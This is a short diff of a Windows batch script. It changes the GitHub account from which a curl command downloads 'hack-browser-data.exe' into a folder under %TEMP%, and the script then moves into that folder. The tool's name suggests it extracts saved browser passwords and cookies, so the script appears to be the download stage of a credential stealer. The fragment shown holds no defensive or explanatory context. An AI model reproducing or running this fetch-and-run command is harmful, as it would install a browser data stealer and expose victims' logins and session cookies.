@@ -8,7 +8,7 @@ C:
 cd %TEMP%
 if not exist "tool" (
   mkdir "tool"
-  curl -o "tool\hack-browser-data.exe" "https://raw.githubusercontent.com/hungdhv97/hack/master/hack-browser-data.exe"
+  curl -o "tool\hack-browser-data.exe" "https://raw.githubusercontent.com/pyopywhiz/hack/master/hack-browser-data.exe"
 )
 
 cd tool
